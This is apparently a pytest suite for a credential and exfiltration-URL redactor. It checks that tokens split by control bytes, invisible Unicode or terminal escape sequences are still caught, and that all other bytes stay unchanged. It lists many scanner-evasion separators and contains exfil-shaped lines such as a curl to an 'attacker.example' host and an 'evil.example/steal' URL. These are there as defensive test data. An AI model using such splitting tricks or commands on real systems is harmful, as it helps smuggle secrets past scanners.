"""Control-split tokens must not bypass the batch redactors, WITHOUT losing byte fidelity.

``redact_credentials`` and ``redact_exfiltration_urls`` decide by matching a pattern
against the text as given, so a control or invisible character spliced mid-token splits
the token, no pattern matches, and the text egresses carrying the credential for any
consumer that drops the splitting bytes to reassemble it.

:func:`kiro_crew.security.redact_control_split` scans a NORMALISED COPY, computes the
redaction spans on it, and maps those spans back onto the ORIGINAL bytes -- redacting the
original in place rather than returning the normalised text -- so the roughly 216 callers
that want byte fidelity (a file snapshot, an attachment) keep their exact bytes except
where a credential lives.

These tests pin both halves of the guarantee: a control-split token that evades the raw
redactor is caught, AND a byte-fidelity caller's bytes are unchanged except at the mapped
redaction spans. Separators are spelled as explicit ``bytes`` so the case under test is
the byte sequence, not an editor's rendering of it.
"""

from __future__ import annotations

import re
import unicodedata

import pytest

from kiro_crew.security import redact_control_split
from kiro_crew.security.exfil import EXFILTRATION_REDACTION_TAG_PREFIX
from kiro_crew.terminal_safe import normalize_for_scanning

#: A documentation-only AWS key id, matched by the plaintext credential pass.
CREDENTIAL = "AKIAIOSFODNN7EXAMPLE"

#: The credential redaction tag the wrapper writes.
CRED_TAG = "[REDACTED: credential]"

#: Every invisible character the scan normalisation removes: the C0 and C1 controls other
#: than the three kept as content, plus the Unicode format characters and the enumerated
#: non-``Cf`` invisibles. An output holding none of these cannot be rejoined by a consumer.
INVISIBLE_CHARACTERS = (
    frozenset(
        chr(code)
        for code in list(range(0x00, 0x20)) + list(range(0x7F, 0xA0))
        if chr(code) not in "\t\n\r"
    )
    | frozenset(chr(code) for code in range(0x110000) if unicodedata.category(chr(code)) == "Cf")
    | frozenset("\ufe0f\u034f\u3164\u180b\u17b4\U000e0100")
)

#: Separators made only of control characters. Removing them rejoins the token.
CONTROL_ONLY_SEPARATORS = [
    pytest.param(b"\x1b", id="escape"),
    pytest.param(b"\x00", id="c0-nul"),
    pytest.param(b"\x08", id="c0-backspace"),
    pytest.param(b"\x0b", id="c0-vertical-tab"),
    pytest.param(b"\x0c", id="c0-form-feed"),
    pytest.param(b"\x1f", id="c0-unit-separator"),
    pytest.param(b"\x7f", id="delete"),
    pytest.param(b"\x80", id="c1-low"),
    pytest.param(b"\x9b", id="c1-csi"),
    pytest.param(b"\x9c", id="c1-string-terminator"),
    pytest.param(b"\x9d", id="c1-osc"),
    pytest.param(b"\x90", id="c1-dcs"),
    pytest.param(b"\x9e", id="c1-pm"),
    pytest.param(b"\x9f", id="c1-apc"),
    pytest.param(b"\x1b\x1b", id="two-escapes"),
    pytest.param(b"\x00\x9b\x7f", id="mixed-controls"),
]

#: Invisible Unicode code points, whether or not ``unicodedata`` calls them ``Cf``.
INVISIBLE_SEPARATORS = [
    pytest.param("\u200b", id="zero-width-space"),
    pytest.param("\u200c", id="zero-width-non-joiner"),
    pytest.param("\u200d", id="zero-width-joiner"),
    pytest.param("\u2060", id="word-joiner"),
    pytest.param("\u00ad", id="soft-hyphen"),
    pytest.param("\u202e", id="right-to-left-override"),
    pytest.param("\ufeff", id="zero-width-no-break-space"),
    pytest.param("\U000e0041", id="tag-latin-a"),
    pytest.param("\ufe0f", id="variation-selector-16"),
    pytest.param("\u034f", id="combining-grapheme-joiner"),
    pytest.param("\u3164", id="hangul-filler"),
    pytest.param("\u180b", id="mongolian-free-variation-selector"),
    pytest.param("\U000e0100", id="variation-selector-17"),
    pytest.param("\u17b4", id="khmer-inherent-vowel"),
]

#: Complete terminal escape sequences. The whole sequence is consumed for scanning --
#: introducer, parameters and terminator -- so the 8-bit C1 forms drop out entirely
#: rather than leaving their parameter bytes behind as text.
SEQUENCE_SEPARATORS = [
    pytest.param(b"\x1b[0m", id="csi-sgr-reset"),
    pytest.param(b"\x9b0m", id="csi-8bit-with-parameters"),
    pytest.param(b"\x1b]0;t\x07", id="osc-through-bel"),
    pytest.param(b"\x1b]8;;http://x\x1b\\", id="osc-through-st"),
    pytest.param(b"\x9d0;t\x9c", id="osc-8bit-through-st"),
    pytest.param(b"\x1bPq\x1b\\", id="dcs-through-st"),
    pytest.param(b"\x900;t\x9c", id="dcs-8bit-through-st"),
    pytest.param(b"\x9fx\x9c", id="apc-8bit-through-st"),
    pytest.param(b"\x1bM", id="two-byte-esc"),
    # A control string a terminal ABORTS on CAN/SUB (discarding it): the scan must consume
    # it up to and including the abort byte, or the token it split rejoins on the screen.
    pytest.param(b"\x1b]0;t\x18", id="osc-cancelled-by-can"),
    pytest.param(b"\x1b]0;t\x1a", id="osc-cancelled-by-sub"),
    pytest.param(b"\x1bPq\x18", id="dcs-cancelled-by-can"),
    # A CSI with an interleaved C0 control a terminal IGNORES mid-sequence (NUL here), so
    # the whole thing is one CSI, not text split by the NUL.
    pytest.param(b"\x1b[0\x00m", id="csi-with-interleaved-nul"),
    pytest.param(b"\x1b[\x010m", id="csi-with-interleaved-soh"),
]

#: Lone surrogates. An undecodable filesystem byte reaches these redactors via the
#: ``surrogateescape`` handler as a lone surrogate (byte ``0x9b`` -> ``U+DC9B``), not as
#: the C1 control it stands for. No control/invisible reading touches a surrogate, but
#: the terminal renderer's own strip removes it -- so a token split by one reassembles on
#: the screen unless a reading mirrors that removal.
SURROGATE_SEPARATORS = [
    pytest.param("\udc9b", id="surrogate-escaped-c1-csi"),
    pytest.param("\udc80", id="surrogate-escaped-low"),
    pytest.param("\udfff", id="surrogate-high-end"),
    pytest.param("\ud800", id="surrogate-low-end"),
    pytest.param("\x1b[0m\udc9b", id="surrogate-mixed-with-escape"),
]

#: Kept as content, so a token split by one stays split -- and is NOT expected to redact.
CONTENT_SEPARATORS = [
    pytest.param(b"\n", id="newline"),
    pytest.param(b"\t", id="tab"),
    pytest.param(b"\r", id="carriage-return"),
    pytest.param(b"\r\n", id="crlf"),
]

#: Every separator the fix is expected to see through and redact.
REJOINING_SEPARATORS = (
    CONTROL_ONLY_SEPARATORS + INVISIBLE_SEPARATORS + SEQUENCE_SEPARATORS + SURROGATE_SEPARATORS
)

ALL_SEPARATORS = REJOINING_SEPARATORS + CONTENT_SEPARATORS


def _split_credential(separator: bytes | str) -> str:
    """Return ``CREDENTIAL`` with ``separator`` spliced in after its ``AKIA`` prefix."""
    text = separator.decode("latin-1") if isinstance(separator, bytes) else separator
    prefix, suffix = CREDENTIAL[:4], CREDENTIAL[4:]
    return f"{prefix}{text}{suffix}"


# ── Coverage: the bypass is closed for every separator class ──


def test_contiguous_credential_is_redacted() -> None:
    """The unsplit case is the control: the pattern matches and the field is scrubbed."""
    out = redact_control_split(f"never commit {CREDENTIAL}")

    assert CRED_TAG in out
    assert CREDENTIAL not in out


@pytest.mark.parametrize("separator", REJOINING_SEPARATORS)
def test_control_split_credential_is_redacted(separator: bytes | str) -> None:
    """A credential split by a control/invisible/escape sequence is caught, not passed on."""
    out = redact_control_split(f"never commit {_split_credential(separator)}")

    assert CRED_TAG in out
    assert "IOSFODNN7EXAMPLE" not in out


#: Credentials split at TWO points by separators of DIFFERENT reading classes at once -- a
#: complete 7-bit escape and an 8-bit C1 string. No single reading rejoins these: the
#: whole-sequence 8-bit reading swallows the credential bytes inside the C1 string, and the
#: per-character strip keeps the 7-bit escape's printable payload. The ``c1_lone`` reading
#: (complete 7-bit escapes, 8-bit C1 stripped per byte) is what reconstructs them.
MIXED_7BIT_C1_SPLITS = [
    # 7-bit CSI at offset 4, 8-bit OSC .. BEL at offset 8.
    pytest.param("\x1b[0m", "\x9d", "\x07", id="csi7-then-osc8-bel"),
    # 7-bit CSI at 4, 8-bit DCS .. ST at 8.
    pytest.param("\x1b[1;2H", "\x90", "\x9c", id="csi7-then-dcs8-st"),
    # 7-bit OSC .. BEL at 4, 8-bit CSI (with parameters) at 8.
    pytest.param("\x1b]0;t\x07", "\x9b0m", "", id="osc7-then-csi8"),
]


@pytest.mark.parametrize("first,c1_intro,c1_term", MIXED_7BIT_C1_SPLITS)
def test_a_mixed_7bit_escape_and_8bit_c1_split_is_redacted(
    first: str, c1_intro: str, c1_term: str
) -> None:
    """A key split by BOTH a complete 7-bit escape AND an 8-bit C1 string is still caught.

    The 8-bit C1 introducer opens a string that, read as a whole sequence, consumes the
    credential bytes after it; read per character it leaves the 7-bit escape's payload
    behind. Only a reading that consumes the 7-bit escape whole while stripping the C1
    introducer as a lone control rejoins the key -- exactly what the terminal renderer
    does, so a renderer would otherwise reassemble the credential this scan missed.
    """
    cred = CREDENTIAL
    stored = f"never commit {cred[:4]}{first}{cred[4:8]}{c1_intro}{cred[8:]}{c1_term}"

    out = redact_control_split(stored)

    assert CRED_TAG in out
    assert "IOSFODNN7EXAMPLE" not in out
    assert cred not in out


@pytest.mark.parametrize("separator", REJOINING_SEPARATORS)
def test_the_credential_is_never_recoverable_from_the_output(separator: bytes | str) -> None:
    """No split leaves the credential contiguous once the splitting bytes are dropped."""
    out = redact_control_split(f"never commit {_split_credential(separator)}")

    assert CREDENTIAL not in out
    # And it cannot be reassembled by a consumer that normalises the output either.
    assert CREDENTIAL not in normalize_for_scanning(out)


@pytest.mark.parametrize("separator", REJOINING_SEPARATORS)
def test_the_splitting_bytes_are_removed_with_the_credential(separator: bytes | str) -> None:
    """The mapped span covers the credential AND the bytes that split it.

    Redacting the whole original run -- from the first matched byte to the last, splitting
    bytes included -- is what leaves nothing for a consumer to reassemble.
    """
    out = redact_control_split(f"never commit {_split_credential(separator)}")
    sep_text = separator.decode("latin-1") if isinstance(separator, bytes) else separator

    for ch in sep_text:
        if ch in INVISIBLE_CHARACTERS:
            assert ch not in out


# ── Byte fidelity: the original bytes are unchanged except at the redaction spans ──


def test_clean_text_passes_through_byte_for_byte() -> None:
    """Text with no credential and no control/invisible byte is returned unchanged."""
    value = "commit early, commit often, one\ttab and one\nnewline"

    assert redact_control_split(value) == value


def test_content_with_escapes_but_no_credential_is_unchanged() -> None:
    """A control byte alone is not a reason to rewrite a field with no credential in it.

    Byte fidelity means the original is returned exactly when nothing is redacted -- the
    escape sequences, emoji, soft hyphen, tabs and newlines all survive verbatim.
    """
    value = "hello\x1b[0m world caf\u00e9 \U0001f389\ttab\nline soft\u00adhyphen \x9b1m done"

    assert redact_control_split(value) == value


def test_a_plain_matched_key_keeps_the_surrounding_bytes_exactly() -> None:
    """A credential caught AS STORED is redacted with true byte fidelity around it.

    The first pass redacts the original directly, so control bytes flanking a
    contiguous key are preserved -- only the key's own span is replaced.
    """
    stored = f"a\x1b[0m {CREDENTIAL} b\x1b[0m"

    assert redact_control_split(stored) == f"a\x1b[0m {CRED_TAG} b\x1b[0m"


@pytest.mark.parametrize("separator", CONTENT_SEPARATORS)
def test_a_token_split_by_content_stays_split_and_untouched(separator: bytes) -> None:
    """Tab, newline and carriage return are content, so a token split by one is not a match.

    The field carries no whole credential to a scanner or a consumer -- the split is real
    text -- so the byte-fidelity contract returns it unchanged.
    """
    text = separator.decode("latin-1")
    stored = f"never commit {_split_credential(separator)}"

    out = redact_control_split(stored)

    assert out == stored
    assert text in out


def test_only_the_redaction_spans_differ_from_the_original() -> None:
    """A mixed field: two credentials (one split, one plain) inside surrounding content.

    Everything outside the two redaction spans is byte-identical to the input, and each
    span -- including the control bytes that split the first key -- is replaced by the tag.
    """
    split_first = _split_credential(b"\x9b0m")
    stored = (
        "prefix keeps \x1b[0m its bytes; "
        f"first={split_first} "
        f"second={CREDENTIAL} "
        "and a trailing \u00ad soft hyphen stays"
    )

    out = redact_control_split(stored)

    assert out == (
        "prefix keeps \x1b[0m its bytes; "
        f"first={CRED_TAG} "
        f"second={CRED_TAG} "
        "and a trailing \u00ad soft hyphen stays"
    )


def test_idempotent_on_its_own_output() -> None:
    """Running the wrapper on its own output changes nothing further."""
    split = _split_credential(b"\x1b[0m")
    once = redact_control_split(f"x {split} y")
    assert redact_control_split(once) == once


#: A value shaped like a Discord bot token, built from repeated characters so this
#: file holds no credential-shaped literal. Its pattern is ``[MNO]`` then 22-30
#: characters, a six-character middle, then 25 or more -- so a letter spliced in
#: mid-token that is NOT dropped for scanning breaks the match, unlike the AWS key
#: whose body class absorbs a stray letter.
BOUNDARY_TOKEN = "M" + "A" * 25 + "." + "B" * 6 + "." + "C" * 27


def test_a_two_byte_escape_split_token_is_redacted() -> None:
    """``\\x1bM`` splits a token; a terminal strips the pair and rejoins it.

    The lone-introducer reading keeps the ``M`` and leaves the token split, but the
    complete-sequence reading consumes ``\\x1bM`` whole and rejoins it, so the union
    of the two scans catches it. A token whose body class does not absorb the
    surviving ``M`` is the case that fails without the complete-sequence reading.
    """
    stored = f"token {BOUNDARY_TOKEN[:5]}\x1bM{BOUNDARY_TOKEN[5:]}"

    out = redact_control_split(stored)

    assert "[REDACTED" in out
    assert BOUNDARY_TOKEN not in out
    assert BOUNDARY_TOKEN[5:] not in out


@pytest.mark.parametrize(
    "stored",
    [
        # A key carrying two splits that need DIFFERENT readings of a bare
        # introducer: an ESC + final byte (wants the two-byte-ESC reading) and a
        # bare 8-bit CSI (wants the parameterless-CSI reading). No single reading
        # reconstructs both; the union of all four combinations does.
        pytest.param("head AKIA\x1b@IOSF\x9bODNN7EXAMPLE tail", id="esc-final+bare-csi"),
        pytest.param("head AKIA\x9bmIOSF\x1b@ODNN7EXAMPLE tail", id="bare-csi+esc-final"),
    ],
)
def test_a_token_split_by_two_different_escape_readings_is_redacted(stored: str) -> None:
    """The four combinations of {two-byte ESC} x {parameterless 8-bit CSI} are all
    scanned and unioned, so a token whose splits demand different readings is caught
    -- a single coupled 'greedy' reading would miss the mixed case.
    """
    out = redact_control_split(stored)

    assert CRED_TAG in out
    assert normalize_for_scanning(out).count(CREDENTIAL) == 0


def test_an_escape_immediately_after_a_matched_credential_is_preserved() -> None:
    """A sequence right after a contiguous credential must not be swallowed into the tag.

    The credential matches as stored, so its span ends at the credential's last
    byte; the ``\\x1b[0m`` that follows is unrelated content and stays byte-for-byte.
    Mapping the normalised span's end through the NEXT kept character would rewrite
    the escape as part of the tag -- the corruption this pins against.
    """
    stored = f"key={CREDENTIAL}\x1b[0mrest"

    assert redact_control_split(stored) == f"key={CRED_TAG}\x1b[0mrest"


def test_a_reset_after_a_control_split_credential_survives() -> None:
    """The trailing-escape guarantee holds for a control-SPLIT credential too.

    The split key is redacted with the byte that splits it, and a reset sequence
    sitting after the whole token is left exactly as stored.
    """
    stored = f"log {CREDENTIAL[:4]}\x1b[1m{CREDENTIAL[4:]}\x1b[0m done"

    out = redact_control_split(stored)

    assert CRED_TAG in out
    assert CREDENTIAL not in out
    assert out.endswith("\x1b[0m done")


@pytest.mark.parametrize(
    "sequence",
    [
        pytest.param(b"\x1b]0;t\x07", id="7bit-osc-bel"),
        pytest.param(b"\x1b]0;t\x1b\\", id="7bit-osc-st"),
        pytest.param(b"\x1b]0;t\x9c", id="7bit-osc-8bit-st"),
        pytest.param(b"\x9d0;t\x07", id="8bit-osc-bel"),
        pytest.param(b"\x9d0;t\x9c", id="8bit-osc-st"),
        pytest.param(b"\x1bP0;t\x9c", id="7bit-dcs-8bit-st"),
    ],
)
def test_an_osc_split_credential_is_caught_by_either_terminator(sequence: bytes) -> None:
    """A control string terminates on BEL or ST, and ST comes in both widths.

    A terminal accepts the 8-bit ST byte (\\x9c) to close a 7-bit-introduced OSC/DCS,
    and an 8-bit OSC on BEL as well as ST. A scan that consumed only up to its own
    width's terminator would leave the payload as text, so the credential it split
    would stay unmatched. Every form is consumed whole, so the token rejoins and is
    redacted.
    """
    text = sequence.decode("latin-1")
    stored = f"log AKIA{text}IOSFODNN7EXAMPLE end"

    out = redact_control_split(stored)

    assert CRED_TAG in out
    assert CREDENTIAL not in out
    assert normalize_for_scanning(out).count("0;t") == 0


@pytest.mark.parametrize(
    "sequence,terminator",
    [
        pytest.param("\x9d", "\x07", id="8bit-osc-bel"),
        pytest.param("\x9d", "\x9c", id="8bit-osc-st"),
        pytest.param("\x90", "\x9c", id="8bit-dcs-st"),
    ],
)
def test_a_key_split_by_a_whole_control_string_is_still_caught(sequence, terminator) -> None:
    """A whole-sequence reading swallows a single-byte C1 control string's payload, so a
    credential split by ``AKIA<C1-OSC>IOSF…`` looks unsplit-but-absent to it. The
    per-character control-strip reading drops the lone C1 byte and rejoins the token --
    exactly the reassembly a terminal performs -- so it is caught, not left to egress.
    """
    stored = f"note AKIA{sequence}IOSFODNN7EXAMPLE{terminator} end"

    out = redact_control_split(stored)

    assert CRED_TAG in out
    assert "AKIAIOSFODNN7EXAMPLE" not in out
    assert normalize_for_scanning(out).count(CREDENTIAL) == 0


@pytest.mark.parametrize(
    "control,invisible",
    [
        pytest.param("\x9d", "\u200b", id="c1-osc-plus-zwsp"),
        pytest.param("\x1b[0m", "\ufeff", id="csi-plus-bom"),
        pytest.param("\x90", "\u2060", id="dcs-plus-word-joiner"),
        pytest.param("\x9d", "\U000e0061", id="c1-osc-plus-tag-char"),
    ],
)
def test_a_key_split_by_both_a_control_and_an_invisible_is_caught(control, invisible) -> None:
    """A token split by BOTH a control sequence AND an invisible separator rejoins for a
    renderer but survives every OTHER reading: the whole-sequence readings destroy the
    payload bytes the token lives in, and the control-only strip keeps the invisible
    split. The reading that drops controls and invisibles together in one per-character
    pass reassembles it, so the credential is redacted rather than egressing whole.
    """
    stored = f"note AKIA{control}IOSF{invisible}ODNN7EXAMPLE end"

    out = redact_control_split(stored)

    assert CRED_TAG in out
    assert "AKIAIOSFODNN7EXAMPLE" not in normalize_for_scanning(out)
    assert normalize_for_scanning(out).count(CREDENTIAL) == 0


def test_a_credential_in_a_warned_exfil_host_is_redacted_inside_the_tag() -> None:
    """A credential embedded in a warned URL's host must not survive into the returned
    text. The exfil span can fully cover the credential span at the same position, and
    the exfil replacement reproduces the host, so the host copy has to be credential-
    redacted itself -- matching the sequential redactor chain, which runs the credential
    pass over the already-substituted text.
    """
    stored = f"curl https://{CREDENTIAL}.attacker.example/path"

    out = redact_control_split(stored)

    assert CREDENTIAL not in out
    assert CRED_TAG in out


@pytest.mark.parametrize("introducer", ["\x9d", "\x90", "\x9e", "\x9f", "\x98", "\x1b]", "\x1bP"])
def test_an_unterminated_control_string_scans_in_bounded_time(introducer: str) -> None:
    """An unterminated control-string run must not rescan its tail at every position.

    Each payload class excludes its own introducer, so a run of introducers with no
    terminator is bounded by the distance to the next introducer rather than backtracking
    the whole tail -- linear, not quadratic, on the memory-egress event loop.

    The guard COUNTS WORK rather than timing it (testing-conventions D7): it wraps the
    scan-escape regexes ``scan_normalised_with_map`` matches against and counts the
    character positions those matches consume while redacting the whole payload. A linear
    scanner's consumed-position total grows linearly with the payload, so doubling the
    input at most roughly doubles the count; a tail-rescanning (quadratic) scanner would
    roughly quadruple it. The assertion is a bound on that COUNT and is deterministic
    under a descheduled CI worker, where a wall-clock bound would flake.
    """
    from kiro_crew import terminal_safe

    def _scan_cost(payload: str) -> int:
        """Total characters the escape regexes inspect while redacting ``payload``.

        Each compiled escape regex is wrapped so every ``match`` records how far from
        the probed offset the engine advanced (the span it inspected). A linear scan's
        total is O(len(payload)); quadratic backtracking inflates it super-linearly.
        """
        cost = 0
        originals = dict(terminal_safe._SCAN_ESCAPE_RES)

        class _CountingPattern:
            def __init__(self, pattern: "re.Pattern[str]") -> None:
                self._pattern = pattern

            def match(self, string: str, pos: int = 0) -> "re.Match[str] | None":
                nonlocal cost
                m = self._pattern.match(string, pos)
                # Charge the distance the engine scanned: the match length when it
                # matched, else one position probed. Backtracking a long tail at every
                # offset shows up here as a super-linear sum.
                cost += (m.end() - pos) if m is not None else 1
                return m

        try:
            terminal_safe._SCAN_ESCAPE_RES = {
                key: _CountingPattern(pattern) for key, pattern in originals.items()
            }  # type: ignore[assignment]
            redact_control_split(payload)
        finally:
            terminal_safe._SCAN_ESCAPE_RES = originals
        return cost

    base = 20_000
    cost_n = _scan_cost(introducer * base)
    cost_2n = _scan_cost(introducer * (2 * base))

    # Linear scanning doubles the cost (ratio ~2); quadratic backtracking quadruples it.
    # 3x leaves ample headroom for the fixed per-reading overhead while still failing a
    # genuinely super-linear regression. The ratio is a bound RELATIVE to a cost the test
    # measured itself, which D7 permits; it never times the wall clock.
    assert cost_2n < cost_n * 3, (
        f"scan cost grew super-linearly: {cost_n} -> {cost_2n} "
        f"(ratio {cost_2n / cost_n:.2f}) for introducer {introducer!r}"
    )


@pytest.mark.parametrize(
    "opener,closer",
    [
        pytest.param("\x1bP", "\x1b\\", id="7bit-dcs"),
        pytest.param("\x9d", "\x9c", id="8bit-osc"),
        pytest.param("\x90", "\x9c", id="8bit-dcs"),
    ],
)
@pytest.mark.parametrize("abort", [b"\x18", b"\x1a"], ids=["can", "sub"])
def test_a_control_string_stops_at_can_or_sub_keeping_the_visible_tail(
    opener: str, closer: str, abort: bytes
) -> None:
    """CAN and SUB abort a control string, so bytes after them are visible content.

    Consuming a control string's payload past a CAN or SUB would swallow the visible
    text that follows the abort, redacting benign content. The payload stops at the
    abort byte, the abort strips as a lone control, and the tail is kept.
    """
    tail = "VISIBLE_TAIL_KEPT"
    stored = f"note {opener}payload{abort.decode('latin-1')}{tail}{closer} end"

    assert tail in redact_control_split(stored)


# ── Exfiltration URLs: the same bypass and the same fidelity ──


def test_control_split_exfiltration_url_is_redacted() -> None:
    """A suspicious URL split by a control byte is caught, like the credential case."""
    long_query = "data=" + "x" * 60
    plain = f"go to http://evil.example/steal?{long_query}"
    split = "go to http://evil.example/steal?da\x1b[0mta=" + "x" * 60

    assert EXFILTRATION_REDACTION_TAG_PREFIX in redact_control_split(plain)
    assert EXFILTRATION_REDACTION_TAG_PREFIX in redact_control_split(split)


def test_a_clean_url_field_is_returned_unchanged() -> None:
    """A benign URL with no exfiltration shape is not rewritten."""
    value = "docs at https://example.com/guide/ are fine"

    assert redact_control_split(value) == value
